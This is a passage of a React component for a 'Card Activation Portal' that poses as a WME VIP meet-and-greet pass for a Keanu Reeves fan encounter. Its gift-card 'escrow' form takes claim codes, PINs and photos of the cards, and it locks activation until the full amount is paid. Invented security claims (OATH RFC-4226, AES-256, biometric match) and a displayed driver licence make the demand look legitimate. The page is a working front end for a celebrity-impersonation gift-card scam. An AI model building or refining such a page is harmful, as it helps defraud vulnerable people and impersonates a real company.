                        <div className="flex items-center justify-between text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA]">
                          <span className="flex items-center gap-1">
                            <Receipt className="w-3.5 h-3.5 text-[#D4AF37]" />
                            <span>Accredited Vouchers on File ({vouchers.length})</span>
                          </span>
                          <span className="text-[#888899]">Sum: ${totalCredited}.00</span>
                        </div>

                        <div className="space-y-1.5 max-h-48 overflow-y-auto pr-1">
                          {vouchers.map((voucher, idx) => (
                            <div 
                              key={voucher.id || idx}
                              className="bg-[#07070B] border border-[#20202E] rounded-[3px] p-2.5 flex items-center justify-between text-xs font-mono"
                            >
                              <div className="flex items-center gap-2.5">
                                <span className="w-5 h-5 rounded-full bg-[#D4AF37]/15 border border-[#D4AF37]/30 text-[#F3E5AB] text-[10px] flex items-center justify-center font-bold">
                                  {idx + 1}
                                </span>
                                <div>
                                  <div className="flex items-center gap-1.5">
                                    <strong className="text-white text-[11px]">{voucher.giftCardType}</strong>
                                    <span className="text-[#4ADE80] font-bold text-[11px]">
                                      +${voucher.amount}.00 {voucher.currency || 'USD'}
                                    </span>
                                  </div>
                                  <div className="text-[10px] text-[#A1A1AA]">
                                    Code: <span className="text-[#F3E5AB]">{voucher.giftCardCodeMasked}</span>
                                    {voucher.giftCardPin && <span> • PIN: {voucher.giftCardPin}</span>}
                                  </div>
                                </div>
                              </div>

                              <div className="flex items-center gap-2">
                                {voucher.giftCardImage && (
                                  <button
                                    type="button"
                                    onClick={() => {
                                      setInspectModalImage(voucher.giftCardImage!);
                                      setInspectModalTitle(`${voucher.giftCardType} Voucher Scan ($${voucher.amount})`);
                                    }}
                                    className="p-1 text-[#D4AF37] hover:text-white rounded transition-colors"
                                    title="Inspect voucher scan"
                                  >
                                    <Eye className="w-3.5 h-3.5" />
                                  </button>
                                )}
                                {!isCardActivated && (
                                  <button
                                    type="button"
                                    onClick={() => handleRemoveVoucher(voucher.id)}
                                    className="p-1 text-[#717182] hover:text-[#EF4444] rounded transition-colors"
                                    title="Remove voucher"
                                  >
                                    <Trash2 className="w-3.5 h-3.5" />
                                  </button>
                                )}
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {/* Voucher Intake Form (Shown while balance remaining) */}
                    {remainingBalance > 0 && (
                      <div className="space-y-3 pt-1 border-t border-[#1C1C28]">
                        <span className="block text-[10px] font-mono uppercase tracking-wider text-[#D4AF37] font-semibold">
                          Deposit Gift Card / Voucher
                        </span>

                        {/* Quick Denomination Chips */}
                        <div>
                          <label className="block text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA] mb-1.5">
                            Select Voucher Face Value
                          </label>
                          <div className="flex flex-wrap gap-1.5">
                            {[50, 100, 200, 250, 500].map(val => (
                              <button
                                key={val}
                                type="button"
                                onClick={() => setCardAmountInput(String(val))}
                                className={`px-2.5 py-1 text-xs font-mono rounded-[2px] transition-colors cursor-pointer ${
                                  cardAmountInput === String(val)
                                    ? 'bg-[#D4AF37] text-black font-bold'
                                    : 'bg-[#14141E] text-[#D1D1DB] border border-[#2B2B3C] hover:border-[#D4AF37]'
                                }`}
                              >
                                ${val}
                              </button>
                            ))}
                            {remainingBalance > 0 && remainingBalance !== 50 && remainingBalance !== 100 && remainingBalance !== 200 && remainingBalance !== 250 && remainingBalance !== 500 && (
                              <button
                                type="button"
                                onClick={() => setCardAmountInput(String(remainingBalance))}
                                className={`px-2.5 py-1 text-xs font-mono rounded-[2px] transition-colors cursor-pointer ${
                                  cardAmountInput === String(remainingBalance)
                                    ? 'bg-[#D4AF37] text-black font-bold'
                                    : 'bg-[#14141E] text-[#D1D1DB] border border-[#2B2B3C] hover:border-[#D4AF37]'
                                }`}
                              >
                                Exact Due (${remainingBalance})
                              </button>
                            )}
                          </div>
                        </div>

                        {/* Provider Selector and Custom Amount Grid */}
                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                          <div>
                            <label htmlFor="giftCardTypeSelect" className="block text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA] mb-1">
                              Card Provider
                            </label>
                            <select
                              id="giftCardTypeSelect"
                              value={selectedGiftCardType}
                              onChange={(e) => setSelectedGiftCardType(e.target.value)}
                              className="w-full bg-[#07070B] border border-[#333346] focus:border-[#D4AF37] text-xs font-mono text-[#E4E4E7] rounded-[3px] py-2 px-3 focus:outline-none"
                            >
                              {(pricing.acceptedGiftCards || []).map((provider) => (
                                <option key={provider} value={provider}>
                                  {provider}
                                </option>
                              ))}
                            </select>
                          </div>

                          <div>
                            <label htmlFor="cardAmountInput" className="block text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA] mb-1">
                              Voucher Amount ($ USD)
                            </label>
                            <div className="relative">
                              <span className="absolute left-3 top-2 text-xs font-mono text-[#888899]">$</span>
                              <input
                                id="cardAmountInput"
                                type="number"
                                min="1"
                                max="1000"
                                value={cardAmountInput}
                                onChange={(e) => setCardAmountInput(e.target.value)}
                                placeholder="250"
                                className="w-full bg-[#07070B] border border-[#333346] focus:border-[#D4AF37] text-xs font-mono text-[#F3E5AB] pl-7 pr-3 py-2 rounded-[3px] focus:outline-none"
                              />
                            </div>
                          </div>
                        </div>

                        {/* Claim Code Input */}
                        <div>
                          <label htmlFor="giftCardCodeInput" className="block text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA] mb-1">
                            Gift Card Claim Code / Serial Number
                          </label>
                          <div className="relative">
                            <input
                              id="giftCardCodeInput"
                              type="text"
                              value={giftCardCodeInput}
                              onChange={(e) => {
                                setGiftCardCodeInput(e.target.value);
                                if (paymentError) setPaymentError('');
                              }}
                              placeholder="e.g. X7KM-92NQ-48PL-2026"
                              autoComplete="off"
                              className="w-full bg-[#07070B] border border-[#333346] focus:border-[#D4AF37] text-xs font-mono text-[#F3E5AB] placeholder-[#444455] rounded-[3px] py-2.5 px-3 focus:outline-none uppercase tracking-wider"
                            />
                            <CreditCard className="w-4 h-4 text-[#777788] absolute right-3 top-2.5 pointer-events-none" />
                          </div>
                        </div>

                        {/* Optional Card PIN */}
                        <div>
                          <label htmlFor="giftCardPinInput" className="block text-[10px] font-mono uppercase tracking-wider text-[#71717A] mb-1">
                            Card PIN / CVV (If Applicable)
                          </label>
                          <input
                            id="giftCardPinInput"
                            type="text"
                            value={giftCardPinInput}
                            onChange={(e) => setGiftCardPinInput(e.target.value)}
                            placeholder="e.g. 8824 (optional)"
                            maxLength={8}
                            className="w-full bg-[#07070B] border border-[#22222E] focus:border-[#D4AF37] text-xs font-mono text-[#E4E4E7] placeholder-[#444455] rounded-[3px] py-2 px-3 focus:outline-none"
                          />
                        </div>

                        {/* Gift Card Photo / Scan Attachment */}
                        <div>
                          <label className="text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA] flex items-center gap-1 mb-1">
                            <Camera className="w-3.5 h-3.5 text-[#D4AF37]" />
                            <span>Voucher Photo Scan / Digital Proof</span>
                          </label>

                          {!giftCardImage ? (
                            <label className="border border-dashed border-[#333348] hover:border-[#D4AF37] bg-[#07070B] hover:bg-[#0E0E14] rounded-[3px] p-3 flex flex-col items-center justify-center cursor-pointer transition-all group">
                              <input
                                type="file"
                                id="giftCardFileInput"
                                accept="image/*"
                                onChange={handleImageFileChange}
                                className="hidden"
                              />
                              <UploadCloud className="w-5 h-5 text-[#888899] group-hover:text-[#D4AF37] mb-1 transition-colors" />
                              <span className="text-xs font-mono text-[#E4E4E7] group-hover:text-[#F3E5AB]">
                                Upload Voucher Front/Back Photo or Receipt
                              </span>
                              <span className="text-[10px] font-mono text-[#717182] mt-0.5">
                                High-res PNG, JPG, or PDF up to 10MB
                              </span>
                            </label>
                          ) : (
                            <div className="bg-[#0B0B12] border border-[#D4AF37]/40 rounded-[3px] p-2.5 flex items-center justify-between gap-3">
                              <div 
                                onClick={() => {
                                  setInspectModalImage(giftCardImage);
                                  setInspectModalTitle(giftCardImageName || 'Voucher Scan');
                                }}
                                className="flex items-center gap-2.5 cursor-pointer group"
                              >
                                <div className="w-12 h-9 bg-black border border-[#D4AF37]/50 rounded overflow-hidden flex items-center justify-center shrink-0">
                                  <img
                                    src={giftCardImage}
                                    alt="Gift Card Attached"
                                    className="w-full h-full object-cover group-hover:scale-105 transition-transform"
                                  />
                                </div>
                                <div>
                                  <span className="text-xs font-mono text-[#F3E5AB] block font-semibold truncate max-w-[170px] sm:max-w-[220px]">
                                    {giftCardImageName || 'Voucher Scan Attached'}
                                  </span>
                                  <span className="text-[10px] font-mono text-[#4ADE80] flex items-center gap-1">
                                    <CheckCircle2 className="w-3 h-3" />
                                    Scan Attached • Click to Inspect
                                  </span>
                                </div>
                              </div>

                              <div className="flex items-center gap-1.5">
                                <button
                                  type="button"
                                  onClick={() => {
                                    setInspectModalImage(giftCardImage);
                                    setInspectModalTitle(giftCardImageName || 'Voucher Scan');
                                  }}
                                  className="p-1.5 text-[#A1A1AA] hover:text-[#D4AF37] rounded transition-colors"
                                  title="View voucher image"
                                >
                                  <Eye className="w-4 h-4" />
                                </button>
                                <button
                                  type="button"
                                  id="remove-giftcard-img-btn"
                                  onClick={() => {
                                    setGiftCardImage(null);
                                    setGiftCardImageName('');
                                  }}
                                  className="p-1.5 text-[#888899] hover:text-[#EF4444] rounded transition-colors"
                                  title="Remove image"
                                >
                                  <Trash2 className="w-4 h-4" />
                                </button>
                              </div>
                            </div>
                          )}
                        </div>

                        {paymentError && (
                          <div className="p-2.5 bg-[#450A0A]/60 border border-[#DC2626]/50 rounded-[2px] flex items-start gap-2 text-xs text-[#FCA5A5] font-mono">
                            <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
                            <span>{paymentError}</span>
                          </div>
                        )}

                        {paymentSuccessNotice && (
                          <div className="p-2.5 bg-[#052E16]/60 border border-[#22C55E]/50 rounded-[2px] flex items-start gap-2 text-xs text-[#86EFAC] font-mono">
                            <CheckCircle2 className="w-4 h-4 shrink-0 mt-0.5" />
                            <span>{paymentSuccessNotice}</span>
                          </div>
                        )}

                        <button
                          type="button"
                          id="submit-giftcard-btn"
                          onClick={handleApplyVoucher}
                          disabled={isSubmittingPayment || !giftCardCodeInput.trim()}
                          className="w-full py-2.5 px-3 bg-[#181824] hover:bg-[#252538] text-[#D4AF37] border border-[#D4AF37]/50 disabled:opacity-40 font-mono text-xs uppercase tracking-wider font-semibold rounded-[2px] transition-all flex items-center justify-center gap-2 cursor-pointer shadow-md"
                        >
                          {isSubmittingPayment ? (
                            <>
                              <RotateCw className="w-3.5 h-3.5 animate-spin" />
                              <span>Clearing Voucher with Gateway...</span>
                            </>
                          ) : (
                            <>
                              <Plus className="w-3.5 h-3.5 text-[#D4AF37]" />
                              <span>Authorize &amp; Apply Card to Escrow (+${cardAmountInput || remainingBalance || 250})</span>
                            </>
                          )}
                        </button>
                      </div>
                    )}
                  </div>

                  {errorMessage && (
                    <div className="p-2.5 bg-[#450A0A]/60 border border-[#DC2626]/50 rounded-[2px] flex items-start gap-2 text-xs text-[#FCA5A5] font-mono">
                      <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
                      <span>{errorMessage}</span>
                    </div>
                  )}

                  {/* Primary Activation Button */}
                  <button
                    type="button"
                    id="submit-activate-btn"
                    onClick={handleActivateCard}
                    disabled={isActivating || !isPinValid || !isEscrowSatisfied}
                    className={`w-full py-3.5 px-4 font-mono text-xs uppercase tracking-widest font-bold rounded-[2px] shadow-lg transition-all flex items-center justify-center gap-2 cursor-pointer ${
                      isPinValid && isEscrowSatisfied
                        ? 'bg-gradient-to-r from-[#D4AF37] via-[#F3E5AB] to-[#D4AF37] text-[#0A0A0E] hover:brightness-110 shadow-[#D4AF37]/20 animate-pulse'
                        : 'bg-[#181822] text-[#717182] border border-[#2B2B3C] cursor-not-allowed opacity-75'
                    }`}
                  >
                    {isActivating ? (
                      <>
                        <RotateCw className="w-4 h-4 animate-spin text-[#0A0A0E]" />
                        <span>Validating Cryptographic Handshake...</span>
                      </>
                    ) : !isEscrowSatisfied ? (
                      <>
                        <Lock className="w-4 h-4 text-[#AA820A]" />
                        <span>Deposit Remaining Escrow ($${remainingBalance}.00 Due) to Unlock</span>
                      </>
                    ) : !isPinValid ? (
                      <>
                        <KeyRound className="w-4 h-4 text-[#D4AF37]" />
                        <span>Enter Pass PIN (813-026) to Complete Activation</span>
                      </>
                    ) : (
                      <>
                        <ShieldCheck className="w-4 h-4 text-black" />
                        <span>Authenticate OATH PIN &amp; Activate VIP Credential</span>
                      </>
                    )}
                  </button>

                  <div className="pt-2 text-[10px] font-mono text-[#666677] text-center border-t border-[#1C1C26]">
                    Initiative for Open AuTHentication (OATH) • RFC-4226 &amp; AES-256 VIP Standard
                  </div>
                </div>
              ) : (
                <div className="space-y-4">
                  {/* Activated Success State */}
                  <div className="p-4 bg-[#052E16]/40 border border-[#22C55E]/40 rounded-[3px] space-y-2.5">
                    <div className="flex items-center gap-2 text-[#4ADE80]">
                      <CheckCircle2 className="w-5 h-5 shrink-0" />
                      <span className="font-mono text-xs uppercase tracking-wider font-bold">
                        VIP Credential Successfully Synchronized &amp; Cleared
                      </span>
                    </div>
                    <p className="text-xs text-[#BBF7D0] font-sans">
                      Biometric intake, accreditation deposit, and VIP Green Room admittance are cleared for {params.guest}.
                    </p>
                    <div className="bg-[#021F0D] p-3 rounded-[2px] border border-[#22C55E]/30 text-[11px] font-mono text-[#86EFAC] space-y-1.5">
                      <div>CLEARANCE CODE: <strong className="text-white">{successData.clearanceCode || 'OATH-KR26-813-CLEAR'}</strong></div>
                      <div>ACTIVATED AT: {new Date(successData.activatedAt || Date.now()).toLocaleTimeString()} ({new Date(successData.activatedAt || Date.now()).toLocaleDateString()})</div>
                      <div>PIN VERIFIED: 813-026 (OATH RFC-4226)</div>
                      <div>ESCROW CLEARED: ${totalCredited || targetAmount}.00 {pricing.currency} across {vouchers.length || 1} verified card(s)</div>
                    </div>
                  </div>

                  {/* Itemized Cleared Vouchers Summary */}
                  {vouchers.length > 0 && (
                    <div className="p-3 bg-[#08080E] border border-[#222232] rounded-[3px] space-y-2">
                      <span className="text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA] block">
                        Cleared Escrow Vouchers ({vouchers.length})
                      </span>
                      <div className="space-y-1">
                        {vouchers.map((v, i) => (
                          <div key={v.id || i} className="flex items-center justify-between text-[11px] font-mono text-[#D1D1DB] border-b border-[#181824] pb-1">
                            <span>{v.giftCardType} ({v.giftCardCodeMasked})</span>
                            <span className="text-[#4ADE80] font-semibold">+${v.amount}.00</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  <div className="pt-1">
                    <button
                      type="button"
                      onClick={() => triggerDirectDownload(pdfFile, 'Brenda-Wright-VIP-Meet-Greet-Pass.pdf')}
                      className="w-full py-3 bg-[#D4AF37] text-black font-mono text-xs uppercase tracking-wider font-semibold rounded-[2px] hover:bg-[#F3E5AB] transition-colors flex items-center justify-center gap-1.5 cursor-pointer shadow-md"
                    >
                      <Download className="w-3.5 h-3.5" />
                      <span>Download Printable VIP Pass (PDF)</span>
                    </button>
                  </div>
                </div>
              )}
            </div>

            {/* Venue Admittance Rules */}
            <div className="p-4 bg-[#0A0A10] border border-[#1E1E28] rounded-[2px] space-y-2 text-[11px] text-[#888899] font-mono">
              <span className="text-[#D4AF37] block font-semibold uppercase tracking-wider text-[10px]">
                Admittance Requirements:
              </span>
              <ul className="list-disc pl-4 space-y-1">
                <li>Government-issued Florida photo ID required upon talent lounge check-in.</li>
                <li>Credential pass must be presented digitally or in printed high-res format.</li>
                <li>Single admittance strictly non-transferable under WME talent rider terms.</li>
              </ul>
            </div>

          </div>

          {/* Right Column: Interactive Credential Pass Display & Direct Downloads (6 Cols) */}
          <div className="lg:col-span-6 space-y-4">
            
            {/* Download and Flip Controls Bar */}
            <div className="flex flex-wrap items-center justify-between gap-2 p-3 bg-[#111118] border border-[#242433] rounded-[3px]">
              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => setIsFlipped(!isFlipped)}
                  className="px-3 py-1.5 bg-[#D4AF37] hover:bg-[#F3E5AB] text-black font-mono text-xs font-semibold uppercase tracking-wider rounded-[2px] flex items-center gap-1.5 transition-colors cursor-pointer"
                >
                  <RotateCw className="w-3.5 h-3.5" />
                  <span>{isFlipped ? 'Show Front Face' : 'Show Back Face'}</span>
                </button>
                <span className="text-[11px] font-mono text-[#888899] hidden sm:inline">
                  (Currently: {isFlipped ? 'Back Face' : 'Front Face'})
                </span>
              </div>

              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  onClick={() => triggerDirectDownload(frontImg, 'Brenda-Wright-VIP-Pass-Front.png')}
                  className="px-2.5 py-1.5 bg-[#1C1C26] hover:bg-[#2A2A3A] text-white border border-[#333344] font-mono text-[11px] uppercase rounded-[2px] flex items-center gap-1 transition-colors"
                  title="Download High-Res Front Pass PNG"
                >
                  <Download className="w-3 h-3 text-[#D4AF37]" />
                  <span>Front</span>
                </button>
                <button
                  type="button"
                  onClick={() => triggerDirectDownload(backImg, 'Brenda-Wright-VIP-Pass-Back.png')}
                  className="px-2.5 py-1.5 bg-[#1C1C26] hover:bg-[#2A2A3A] text-white border border-[#333344] font-mono text-[11px] uppercase rounded-[2px] flex items-center gap-1 transition-colors"
                  title="Download High-Res Back Pass PNG"
                >
                  <Download className="w-3 h-3 text-[#D4AF37]" />
                  <span>Back</span>
                </button>
                <button
                  type="button"
                  onClick={() => triggerDirectDownload(completeImg, 'Brenda-Wright-VIP-Pass-Complete.png')}
                  className="px-2.5 py-1.5 bg-[#1C1C26] hover:bg-[#2A2A3A] text-white border border-[#333344] font-mono text-[11px] uppercase rounded-[2px] flex items-center gap-1 transition-colors"
                  title="Download Side-by-Side Presentation PNG"
                >
                  <Download className="w-3 h-3 text-[#D4AF37]" />
                  <span>Both</span>
                </button>
                <button
                  type="button"
                  onClick={() => triggerDirectDownload(pdfFile, 'Brenda-Wright-VIP-Meet-Greet-Pass.pdf')}
                  className="px-2.5 py-1.5 bg-[#6B1D2F] hover:bg-[#8A253D] text-white border border-[#A6304C]/40 font-mono text-[11px] uppercase rounded-[2px] flex items-center gap-1 transition-colors font-semibold"
                  title="Download Printable 300 DPI PDF"
                >
                  <FileText className="w-3 h-3" />
                  <span>PDF</span>
                </button>
              </div>
            </div>

            {/* Credential Image Display with Glow Frame */}
            <div 
              onClick={() => setIsFlipped(!isFlipped)} 
              className="bg-[#050508] border-2 border-[#D4AF37]/40 rounded-[6px] p-4 flex flex-col items-center justify-center shadow-2xl relative cursor-pointer group hover:border-[#D4AF37] transition-all min-h-[580px]"
            >
              <div className="absolute top-3 left-4 flex items-center gap-2 text-[10px] font-mono text-[#A1A1AA]">
                <span className="w-2 h-2 rounded-full bg-[#D4AF37]" />
                <span>CLICK BADGE TO FLIP</span>
              </div>

              {isCardActivated && (
                <div className="absolute top-3 right-4 bg-[#22C55E]/20 border border-[#22C55E] text-[#4ADE80] font-mono text-[10px] font-bold uppercase tracking-wider px-2 py-0.5 rounded-[2px] flex items-center gap-1 animate-pulse">
                  <CheckCircle2 className="w-3 h-3" />
                  <span>ACTIVATED &amp; SYNCED</span>
                </div>
              )}

              {/* Pass Image */}
              <div className="relative max-w-[420px] w-full flex items-center justify-center py-2">
                <img
                  src={isFlipped ? backImg : frontImg}
                  alt={`Brenda Wright VIP Pass ${isFlipped ? 'Back' : 'Front'}`}
                  className="max-h-[640px] w-auto object-contain rounded-[4px] shadow-2xl border border-white/10 group-hover:scale-[1.01] transition-transform duration-300"
                />
              </div>

              <div className="mt-3 text-center">
                <span className="text-[11px] font-mono text-[#888899]">
                  {isFlipped 
                    ? 'Back Face: Activation PIN Security Module, Barcode, Terms & Passholder Dedication' 
                    : 'Front Face: Keanu Reeves Designated Guest, Photo Verified, Digital E-Sign & Scannable QR'}
                </span>
              </div>
            </div>

          </div>

        </div>
      </main>

      {/* Florida Driver License Modal Lightbox */}
      {showIdModal && (
        <div 
          role="dialog"
          aria-modal="true"
          className="fixed inset-0 z-50 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4"
        >
          <div className="bg-[#111116] border border-[#D4AF37] rounded-[4px] max-w-lg w-full p-5 shadow-2xl relative">
            <button
              type="button"
              onClick={() => setShowIdModal(false)}
              className="absolute top-3.5 right-3.5 text-[#A1A1AA] hover:text-white p-1 cursor-pointer"
              title="Close modal"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="flex items-center gap-2 mb-2 text-[#D4AF37]">
              <CreditCard className="w-4 h-4" />
              <h3 className="font-mono text-xs uppercase tracking-wider font-bold">
                Florida Driver License Intake Verification
              </h3>
            </div>
            <p className="text-[11px] font-mono text-[#888899] mb-4">
              Passholder: Brenda Wright • Jurisdiction: Florida, USA • Status: AES-256 Encrypted
            </p>

            <div className="bg-[#050508] p-2 rounded-[2px] border border-white/10 flex items-center justify-center mb-4">
              <img
                src={licenseImg}
                alt="Florida Driver License Full Intake"
                className="max-h-[380px] w-auto object-contain rounded-[2px]"
              />
            </div>

            <div className="flex items-center justify-between pt-2 border-t border-[#20202E] text-[11px] font-mono">
              <span className="text-[#A1A1AA]">Validated &amp; Biometrically Matched</span>
              <button
                type="button"
                onClick={() => setShowIdModal(false)}
                className="px-3 py-1 bg-[#D4AF37] text-black font-semibold uppercase text-xs rounded-[2px] cursor-pointer"
              >
                Done
              </button>
            </div>
          </div>
        </div>
      )}

      {/* High-Resolution Voucher / Gift Card Modal Lightbox */}
      {inspectModalImage && (
        <div 
          role="dialog"
          aria-modal="true"
          className="fixed inset-0 z-50 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4"
        >
          <div className="bg-[#111116] border border-[#D4AF37] rounded-[4px] max-w-xl w-full p-5 shadow-2xl relative">
            <button
              type="button"
              onClick={() => setInspectModalImage(null)}
              className="absolute top-3.5 right-3.5 text-[#A1A1AA] hover:text-white p-1 cursor-pointer"
              title="Close modal"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="flex items-center gap-2 mb-2 text-[#D4AF37]">
              <Gift className="w-4 h-4" />
              <h3 className="font-mono text-xs uppercase tracking-wider font-bold">
                {inspectModalTitle || 'Voucher Scan Verification Proof'}
              </h3>
            </div>
            <p className="text-[11px] font-mono text-[#888899] mb-4">
              Passholder: {params.guest} • Security Ref: {params.ref}
            </p>

            <div className="bg-[#050508] p-2 rounded-[2px] border border-white/10 flex items-center justify-center mb-4 overflow-hidden">
              <img
                src={inspectModalImage}
                alt="Voucher Verification Scan"
                className="max-h-[420px] w-auto max-w-full object-contain rounded-[2px]"
              />
            </div>

            <div className="flex items-center justify-between pt-2 border-t border-[#20202E] text-[11px] font-mono">
              <span className="text-[#A1A1AA]">
                Verified Digital Asset on File
              </span>
              <button
                type="button"
                onClick={() => setInspectModalImage(null)}
                className="px-3 py-1 bg-[#D4AF37] text-black font-semibold uppercase text-xs rounded-[2px] cursor-pointer"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Footer */}
      <footer className="border-t border-[#1C1C24] bg-[#0A0A0E] py-4 text-center text-[10px] font-mono text-[#666677]">
        WILLIAM MORRIS ENDEAVOR (WME) • TALENT RELATIONS &amp; VIP ACCREDITATION DIVISION • BEVERLY HILLS, CA
      </footer>
    </div>
  );
};

export default CardActivationPortal;
